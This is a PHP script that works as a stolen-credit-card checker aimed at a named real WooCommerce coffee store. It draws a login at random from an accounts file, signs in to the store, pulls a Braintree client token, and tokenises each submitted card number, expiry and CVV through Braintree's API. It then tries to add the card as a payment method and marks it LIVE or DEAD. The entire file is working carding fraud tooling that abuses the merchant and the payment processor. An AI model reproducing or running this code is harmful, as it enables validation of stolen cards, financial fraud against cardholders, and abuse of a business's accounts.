<?php
error_reporting(0); 

if($_SERVER['REQUEST_METHOD'] == 'POST'){ 
    extract($_POST); 
} 
else { 
   extract($_GET); 
} 
 
function GetStr($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} 

function RandomString($length = 7)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$separator = explode("|", $lista);
$cc = $separator[0]; 
$mm = $separator[1]; 
$yy = $separator[2]; 
$cvv = $separator[3]; 
$postcode = mt_rand(10080, 94545);
$str = RandomString();
$username = RandomString().mt_rand(1, 999);

$list = file('accounts.txt');
$account = $list[rand(0, count($list) - 1)];
$separate = explode(":", $account); 
$email = $separate[0];
$password = $separate[1];

$cbin = substr($cc, 0, 1); 
if($cbin == 5){ 
    $cbin = 'master-card'; 
} 
else if($cbin == 4){ 
    $cbin = 'visa'; 
} 
else if($cbin == 3){ 
 $cbin = 'amex'; 
} 
else { 
  $cbin = 'null'; 
}

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://www.modest.coffee/my-account/add-payment-method/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    )
));
    $prepare_login = curl_exec($ch);
    $login_nonce = GetStr($prepare_login, 'name="woocommerce-login-nonce" value="', '"');

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://www.modest.coffee/my-account/add-payment-method/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.modest.coffee',
        'referer: https://www.modest.coffee/my-account/add-payment-method/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "username=$email&password=$password&woocommerce-login-nonce=$login_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&login=Log+in",
));
    $login = curl_exec($ch);

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://www.modest.coffee/my-account/add-payment-method/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'referer: https://www.modest.coffee/my-account/add-payment-method/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    )
));
    $prepare_payment = curl_exec($ch);
    $add_payment_nonce = GetStr($prepare_payment, 'name="woocommerce-add-payment-method-nonce" value="', '"');
    $braintree_nonce = GetStr($prepare_payment, '"type":"credit_card","client_token_nonce":"', '"');

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://www.modest.coffee/wp-admin/admin-ajax.php',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://www.modest.coffee',
        'referer: https://www.modest.coffee/my-account/add-payment-method/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'x-requested-with: XMLHttpRequest'
    ),
    CURLOPT_POSTFIELDS => "action=wc_braintree_credit_card_get_client_token&nonce=$braintree_nonce",
));
    $admin_ajax = curl_exec($ch);
    $clientToken = GetStr($admin_ajax, '"data":"', '"');
    $decoded = base64_decode($clientToken);
    $parsedToken = GetStr($decoded, '"authorizationFingerprint":"', '"');
    $b3ClientId = GetStr($decoded, '"braintreeClientId":"', '"');

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: */*',
        'Authorization: Bearer '.$parsedToken.'', 
        'braintree-version: 2018-05-10',
        'content-type: application/json',
        'Origin: https://assets.braintreegateway.com',
        'Referer: https://assets.braintreegateway.com/web/3.48.0/html/hosted-fields-frame.min.html',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
));
    $graphql = curl_exec($ch);
    $token = GetStr($graphql, '"token":"','"');

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://www.modest.coffee/my-account/add-payment-method/',
    CURLOPT_HEADER => 0,
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_COOKIEFILE => getcwd(). '/cookie.txt',
    CURLOPT_COOKIEJAR => getcwd(). '/cookie.txt',
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.modest.coffee',
        'referer: https://www.modest.coffee/my-account/add-payment-method/',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=$cbin&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce=$token&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&wc-braintree-paypal-tokenize-payment-method=true&woocommerce-add-payment-method-nonce=$add_payment_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
));
    $execute = curl_exec($ch);
    curl_close($ch); 
    $respo = GetStr($execute, 'Status code ', '</li>');

if(strpos($execute, 'payment method added')){ 
    
    echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Authorized</span></td></tr><br>';
}
elseif(strpos($execute, 'Gateway Rejected: avs')){ 
    
    echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">'.$respo.'</span></td></tr><br>'; 
}
elseif(strpos($execute, 'Status code')){ 
    
    echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">'.$respo.'</span></td></tr><br>'; 
    
}
else { 
    
	echo '<tr><td><span class="badge badge-outline-warning badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-warning badge-pill">Error Not Listed</span></td></tr><br>';
    
}
unlink("cookie.txt");
?>
